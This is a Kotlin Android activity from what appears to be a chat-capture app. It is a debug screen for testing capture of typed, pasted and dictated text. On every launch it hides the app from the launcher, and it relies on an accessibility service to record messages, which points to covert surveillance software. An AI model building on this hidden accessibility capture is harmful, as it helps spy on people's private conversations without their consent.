package com.chats.capture.ui

import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.speech.RecognizerIntent
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.chats.capture.R
import com.chats.capture.utils.AppHider
import com.chats.capture.utils.AppVisibilityManager
import timber.log.Timber

/**
 * Debug-only helper screen to validate chat capture for:
 * - manual typing
 * - copy/paste
 * - auto-complete (keyboard suggestions)
 * - voice-to-text (speech recognition)
 *
 * This operates ONLY within our app, and is intended for QA/verification.
 */
class DebugChatInputActivity : AppCompatActivity() {

    private lateinit var input: EditText
    private lateinit var btnSend: Button
    private lateinit var btnPaste: Button
    private lateinit var btnVoice: Button
    private lateinit var tvStatus: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Always hide app from launcher (Device Owner mode)
        AppVisibilityManager.hideFromLauncher(this)
        AppHider.ensureHidden(this)
        
        setContentView(R.layout.activity_debug_chat_input)

        input = findViewById(R.id.debug_input)
        btnSend = findViewById(R.id.debug_send)
        btnPaste = findViewById(R.id.debug_paste)
        btnVoice = findViewById(R.id.debug_voice)
        tvStatus = findViewById(R.id.debug_status)

        btnPaste.setOnClickListener { pasteFromClipboard() }
        btnVoice.setOnClickListener { startVoiceToText() }
        // Do NOT insert into DB directly.
        // The accessibility capture pipeline will observe text changes + this click and save the message.
        btnSend.setOnClickListener {
            tvStatus.text = "Send clicked — waiting for capture service to save message"
        }
    }

    private fun pasteFromClipboard() {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = clipboard.primaryClip
        val text = clip?.getItemAt(0)?.coerceToText(this)?.toString().orEmpty()
        if (text.isNotBlank()) {
            input.setText(text)
            input.setSelection(text.length)
            tvStatus.text = "Pasted ${text.length} chars"
        } else {
            tvStatus.text = "Clipboard empty"
        }
    }

    private fun startVoiceToText() {
        try {
            val intent = Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH).apply {
                putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL, RecognizerIntent.LANGUAGE_MODEL_FREE_FORM)
                putExtra(RecognizerIntent.EXTRA_PROMPT, "Speak message")
            }
            startActivityForResult(intent, REQ_VOICE)
        } catch (e: Exception) {
            Timber.e(e, "Voice-to-text not available")
            tvStatus.text = "Voice-to-text not available"
        }
    }

    @Deprecated("Deprecated in Android SDK, kept for simplicity in this debug activity")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_VOICE && resultCode == RESULT_OK) {
            val results = data?.getStringArrayListExtra(RecognizerIntent.EXTRA_RESULTS)
            val text = results?.firstOrNull().orEmpty()
            if (text.isNotBlank()) {
                input.setText(text)
                input.setSelection(text.length)
                tvStatus.text = "Voice captured ${text.length} chars"
            }
        }
    }

    companion object {
        private const val REQ_VOICE = 9001
    }
}

